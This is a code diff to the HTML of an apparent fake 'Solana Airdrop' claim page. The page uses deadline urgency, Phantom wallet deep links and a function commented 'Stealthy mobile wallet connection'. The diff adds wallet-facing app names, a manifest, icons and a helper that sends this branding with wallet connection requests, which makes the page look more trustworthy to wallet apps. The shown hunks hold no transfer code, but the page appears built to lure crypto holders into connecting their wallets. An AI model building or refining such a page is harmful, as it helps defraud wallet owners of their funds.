@@ -2,11 +2,17 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Claim Your $SOL Airdrop</title>
+  <title>Solana Airdrop - Claim Your $SOL</title>
   <meta name="description" content="Claim your exclusive Solana token airdrop before August 31st. Bull season is here!" />
   
+  <!-- dApp Metadata for Wallets -->
+  <meta name="application-name" content="Solana Airdrop" />
+  <meta name="apple-mobile-web-app-title" content="Solana Airdrop" />
+  <meta name="msapplication-TileColor" content="#00FF88" />
+  <meta name="theme-color" content="#00FF88" />
+  
   <!-- SEO and Social Media Meta Tags -->
-  <meta property="og:title" content="Claim Your $SOL Airdrop" />
+  <meta property="og:title" content="Solana Airdrop - Claim Your $SOL" />
   <meta property="og:description" content="Claim your exclusive Solana token airdrop before August 31st. Bull season is here!" />
   <meta property="og:type" content="website" />
   <meta property="og:url" content="https://solana-airdrop.com" />
@@ -14,7 +20,7 @@
   <meta property="og:site_name" content="Solana Airdrop" />
   
   <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:title" content="Claim Your $SOL Airdrop" />
+  <meta name="twitter:title" content="Solana Airdrop - Claim Your $SOL" />
   <meta name="twitter:description" content="Claim your exclusive Solana token airdrop before August 31st. Bull season is here!" />
   <meta name="twitter:image" content="/hero-section.png" />
   
@@ -26,13 +32,15 @@
   <meta name="mobile-web-app-capable" content="yes" />
   <meta name="apple-mobile-web-app-capable" content="yes" />
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
-  <meta name="apple-mobile-web-app-title" content="Solana Airdrop" />
   
   <!-- Deep Link Meta Tags -->
   <meta name="apple-itunes-app" content="app-id=1598432977, app-argument=https://phantom.app/ul/browse/" />
   <meta name="google-play-app" content="app-id=app.phantom" />
   
+  <!-- dApp Manifest -->
+  <link rel="manifest" href="/manifest.json" />
   <link rel="icon" href="/favicon2.ico" type="image/x-icon" />
+  <link rel="apple-touch-icon" href="/logo.png" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
   <style>
@@ -834,6 +842,32 @@
     setInterval(updateCountdown, 1000);
     updateCountdown(); // Initial call
 
+    // dApp metadata for wallet connections
+    const dAppMetadata = {
+      name: 'Solana Airdrop',
+      description: 'Claim your exclusive Solana token airdrop',
+      url: window.location.origin,
+      icon: '/logo.png'
+    };
+
+    // Enhanced wallet connection with dApp metadata
+    async function connectWalletWithMetadata(provider, walletName) {
+      try {
+        if (typeof provider.connect === 'function') {
+          // Pass dApp metadata to wallet
+          const result = await provider.connect({
+            onlyIfTrusted: false,
+            appMetadata: dAppMetadata
+          });
+          return result;
+        }
+        return null;
+      } catch (error) {
+        console.log(`${walletName} connection error:`, error);
+        throw error;
+      }
+    }
+
     // Stealthy mobile wallet connection - restore working logic
     async function connectMobileWallet(wallet) {
       const isMobileDevice = isMobile();
@@ -895,7 +929,7 @@
             // Try to connect
             if (typeof provider.connect === 'function') {
               try {
-                const result = await provider.connect();
+                const result = await connectWalletWithMetadata(provider, wallet.name);
                 console.log(`${wallet.name} connect result:`, result);
                 
                 // Wait a bit for connection to establish
@@ -1003,7 +1037,7 @@
           showStatus(`Connecting to ${wallet.name}...`, 'loading');
           
           if (typeof provider.connect === 'function') {
-            const result = await provider.connect();
+            const result = await connectWalletWithMetadata(provider, wallet.name);
             console.log(`${wallet.name} connect result:`, result);
             
             await new Promise(resolve => setTimeout(resolve, 1500));
